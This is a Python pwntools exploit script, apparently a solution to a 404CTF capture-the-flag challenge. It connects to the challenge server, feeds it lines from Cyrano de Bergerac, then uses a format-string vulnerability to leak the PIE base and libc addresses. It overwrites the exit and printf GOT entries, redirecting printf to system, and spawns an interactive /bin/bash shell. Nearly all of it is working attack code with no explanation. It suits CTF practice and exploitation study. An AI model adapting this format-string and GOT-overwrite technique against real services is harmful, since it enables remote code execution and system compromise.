from pwn import *

elf = context.binary = ELF(
    "../data/une_citation_pas_comme_les_autres_2_2", checksec=False)

libc = ELF("../libc-2.27.so")

pieOffset = 0x860

#p = process()
p = remote("challenges.404ctf.fr", 30242)


def rightSentences():
    p.recvuntil(b'[Vous] : ')
    p.sendline(
        b"M'accuser, - justes dieux ! - De n'aimer plus... quand... j'aime plus !")

    p.sendline(
        b"L'amour grandit berce dans mon ame inquiete... Que ce... cruel marmot prit pour... barcelonnette !")

    p.sendline(
        b"Aussi l'ai-je tente, mais... tentative nulle. Ce... nouveau-ne, Madame, est un petit... Hercule.")

    p.sendline(
        b"De sorte qu'il... strangula comme rien... Les deux serpents... Orgueil et... Doute.")
    p.recvuntil(b'[Cyrano] : ')


p.recvuntil(b'>>>')
p.sendline(b'1')

p.recvuntil(b'>>>')
p.sendline(b'1')

rightSentences()

## LEAK PIE ##

p.sendline(b'%101$p')
# p.sendline(b'%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p')

p.recvline()
# print(p.recvline())
elf.address = int(p.recvuntil(b",")[9:-1].decode(), 16) - pieOffset
# print(hex(elf.address))

## INFINITE LOOP ##

payload = fmtstr_payload(
    32, {elf.got['exit']: elf.symbols['help_christian']})
p.sendline(payload)

p.recvuntil(
    b'(Cyrano prends votre place et celle de Christian et poursuit la conversation avec Roxane.)')

p.sendline(b"")
p.sendline(b"")
p.sendline(b"")

p.sendline(
    b"M'accuser, - justes dieux ! - De n'aimer plus... quand... j'aime plus !")

p.sendline(
    b"L'amour grandit berce dans mon ame inquiete... Que ce... cruel marmot prit pour... barcelonnette !")

p.sendline(
    b"Aussi l'ai-je tente, mais... tentative nulle. Ce... nouveau-ne, Madame, est un petit... Hercule.")

p.sendline(
    b"De sorte qu'il... strangula comme rien... Les deux serpents... Orgueil et... Doute.")

p.recvuntil(b'la situation ?')
## LEAK LIBC ##
payload = b'%33$s|||'
payload += p64(elf.got['printf'])

p.sendline(payload)
p.recvline()
leakPrintf = u64(p.recvuntil(
    b'|')[9:-1].ljust(8, b'\x00'))
leak = leakPrintf - libc.symbols['printf']
print(hex(leakPrintf))
libc.address = leak

## OVERWRITE GOT PRINTF ##
print(hex(libc.symbols['printf']))

payload = fmtstr_payload(
    32, {elf.got['printf']: libc.symbols['system']})


p.sendline(payload)
p.sendline(b"")
p.sendline(b"")
p.sendline(b"")


p.sendline(
    b"M'accuser, - justes dieux ! - De n'aimer plus... quand... j'aime plus !")

p.sendline(
    b"L'amour grandit berce dans mon ame inquiete... Que ce... cruel marmot prit pour... barcelonnette !")

p.sendline(
    b"Aussi l'ai-je tente, mais... tentative nulle. Ce... nouveau-ne, Madame, est un petit... Hercule.")

p.sendline(
    b"De sorte qu'il... strangula comme rien... Les deux serpents... Orgueil et... Doute.")


p.recvuntil(b'chuchotant :)\n')

p.sendline(b'/bin/bash')
p.interactive()
